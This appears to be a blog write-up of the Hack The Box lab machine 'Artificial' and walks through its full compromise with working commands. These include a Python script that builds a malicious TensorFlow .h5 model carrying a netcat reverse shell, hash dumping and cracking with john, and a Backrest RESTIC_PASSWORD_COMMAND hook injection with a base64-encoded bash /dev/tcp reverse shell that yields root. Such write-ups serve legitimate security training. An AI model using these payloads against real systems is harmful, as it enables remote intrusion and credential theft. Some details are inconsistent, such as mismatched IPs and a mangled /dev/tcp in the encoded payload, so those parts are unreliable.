---
layout: default
title: Artificial [EN]
---


**Platform:** Linux\
**IP:** 10.129.70.3\
**Difficulty:** Easy\
**Author:** NoSec

> 🚨 **Follow the HTB grind in real-time — leaks, drops, and deep writeups**  
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)  
> _Don't read. Join._

---

## Recon

```shell
nmap -sC -sV -T4 10.129.70.3

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 14:07 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
```

**/etc/hosts edit:**
```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

The website provides login and registration functionality. After signing up, it allows uploading `.h5` files.

### Generating a malicious TensorFlow model(tenserflow-cpu==2.13.1 a required)

```python
# model_gen.py
import tensorflow as tf
import os

def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.44 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("nosechere.h5")
```

**Docker command:**
```bash
sudo docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 model_gen.py
```

After uploading:
```bash
nc -lvnp 4444
```

---

## SQLite Database Enumeration

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite3" \) 2>/dev/null
```

Found: `/home/app/app/instance/users.db`

```bash
sqlite3 /home/app/app/instance/users.db
.tables
.schema user
SELECT * FROM user;
```

### Cracking hashes (raw-md5):

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Example results:
```
mattp005
marwinn
```

---

## Privilege Escalation (Backup leak)

Using the `redteam-launcher` to check backups(https://github.com/No4Sec/redteam-launcher):
```
/var/backups/backrest_backup.tar.gz
```

**Download via HTTP server:**
```bash
cd /var/backups
python3 -m http.server
```

**On Kali:**
```bash
wget http://10.129.70.3:8000/backrest_backup.tar.gz
```

**Extract:**
```bash
tar -xvf backrest_backup.tar.gz
```

**config.json:**
```json
{
  "auth": {
    "users": [
      {
        "name": "backrest",
        "passwordBcrypt": "$2a$10$..."
      }
    ]
  }
}
```

Base64 decode:
```bash
cat hash.txt | base64 -d
```

John bcrypt:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

---

## Local RESTIC Web UI (port 9898)

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

After port forwarding, we can access the Backrest login page. Use the dumped credentials to log in and create a new repo.

**Environment variable exploit:**
```bash
RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
```

**Important:** for the `Hook` field, use:
```bash
RESTIC_PASSWORD_COMMAND=echo 'YmFzaCAtaSAmJiAvZGVyL3RjcC8xMC4xNi4xMzUvNDQ0NCAwPiYxCg==' | base64 -d | bash
```

**Flag:** `ON_ERROR_IGNORE`

**Why base64?** Because the input field tends to break special characters. Encoding helps to deliver the payload cleanly.

```bash
echo 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1' | base64
```

Then submit, and we get a root shell back:
```bash
nc -lvnp 4444
```
```bash
(root㉿NoSec)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 50526
bash: cannot set terminal process group (28638): Inappropriate ioctl for device
bash: no job control in this shell
root@artificial:/# cd root
cd root
root@artificial:~# ls
ls
root.txt
scripts
root@artificial:~# 
```

---

## 🧩 Summary

Artificial is an easy but creative machine combining multiple exploitation vectors:

- Remote shell via malicious machine learning model
- Hash extraction from SQLite database
- Bcrypt hash found in backup archive
- RESTIC environment variable leading to RCE and root shell

The `.h5` TensorFlow model with embedded code execution and the RESTIC hook exploit were both unique highlights of the box.

**Key takeaways:**
- Never trust user-uploaded files
- Avoid running backup services as root
- Always inspect `.tar.gz` files — they may contain secrets :)

---

🎯 Rooted. Moving on to the next one. //

